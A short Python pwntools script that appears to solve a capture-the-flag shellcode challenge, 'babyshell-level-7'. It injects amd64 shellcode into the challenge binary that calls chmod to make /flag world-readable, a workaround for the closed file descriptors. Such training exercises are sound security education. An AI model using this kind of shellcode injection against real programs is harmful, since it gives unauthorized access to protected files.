# Write and execute shellcode to read the flag, but all file descriptors (including stdin, stderr and stdout!) are closed.
from pwn import *

p = process('/challenge/babyshell-level-7', aslr=False)
context.update(arch="amd64")

shellcode = asm(
'''
lea rdi, [rip+flag]
mov rsi, 0777
mov rax, 0x5a
syscall

flag:
.string "/flag"
''')

p.send(shellcode)
p.interactive()
